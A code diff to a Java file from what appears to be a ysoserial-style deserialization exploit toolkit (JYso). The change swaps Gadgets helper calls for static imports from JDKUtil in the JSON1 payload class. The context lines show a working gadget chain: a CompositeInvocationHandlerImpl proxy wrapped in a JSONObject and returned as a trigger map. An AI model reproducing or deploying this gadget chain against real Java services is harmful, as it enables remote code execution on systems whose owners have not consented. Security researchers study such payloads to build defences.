@@ -13,6 +13,9 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+import static com.qi4l.JYso.gadgets.JDKUtil.makeMap;
+
 
 /**
  * A bit more convoluted example
@@ -76,7 +79,7 @@ public class JSON1 implements ObjectPayload<Object> {
         InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
         ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
         Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
-        final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
+        final CompositeData cdsProxy = createProxy(invocationHandler, CompositeData.class, ifaces);
 
         JSONObject jo = new JSONObject();
         Map m = new HashMap();
@@ -85,6 +88,6 @@ public class JSON1 implements ObjectPayload<Object> {
         Reflections.setFieldValue(jo, "properties", m);
         Reflections.setFieldValue(t1, "dataMap", jo);
         Reflections.setFieldValue(t2, "dataMap", jo);
-        return Gadgets.makeMap(t1, t2);
+        return makeMap(t1, t2);
     }
 }
